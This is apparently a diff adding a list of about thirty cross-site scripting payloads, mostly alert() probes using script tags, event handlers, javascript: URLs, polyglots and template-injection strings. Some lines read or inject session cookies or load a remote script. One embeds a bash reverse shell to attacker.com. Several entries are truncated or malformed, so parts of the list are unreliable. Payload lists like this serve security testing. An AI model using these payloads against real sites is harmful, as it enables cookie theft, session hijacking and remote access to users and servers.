@@ -1,0 +1,30 @@
+<script>alert('XSS');</script>
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+<img src=x onerror=alert('XSS');>
+<svg/onload=alert('XSS')>
+iframe src="javascript:alert('XSS');">
+img src=a onerror=alert(document.cookie)>
+<a href="javascript:alert('XSS')">Click me</a>
+<script>jQuery.get('http://example.com/malicious.js')</script>    
+<%= alert('XSS') %>
+<img src="x" onerror="alert('XSS')">
+<div data-erb="<%= alert('XSS') %>">
+{{ request.GET['xss'] }}
+<script>{{ request.COOKIES['sessionid'] | safe }}</script>
+<script>alert(document.cookie)</script>
+<iframe src="javascript:alert('XSS')"></iframe>
+<!--#exec cmd="alert('XSS')"--> (For servers that process SSI)
+<script src="data:text/javascript,alert('XSS')"></script>
+<svg onload="+"bash -i >& /dev/tcp/attacker.com/8080 0>&1"+">
+<script>if(/Mac|iPad|iPhone|iPod/.test(navigator.platform))alert('XSS');</script>
+<!--#echo var="HTTP_USER_AGENT"-->
+<LocationMatch "<script>alert('XSS')</script>">
+<script>location.hash="XSS";alert(location.hash.slice(1));</script>
+nginx: [alert("XSS");]
+aVaScRiPt:alert('XSS')//\";alert('XSS')//';alert('XSS')//\";alert('XSS')//--></script><script>alert('XSS')//<script>
+avascript://'/alert('XSS')//';alert('XSS')//\";alert('XSS')//</title><script>alert('XSS')</script>
+div onmouseover="alert('XSS')">Hover me!</div>
+button onclick="alert('XSS')">Click Me</button>
+<input onfocus=alert('XSS') autofocus>
+<form action="javascript:alert('XSS')"><input type="submit"></form>
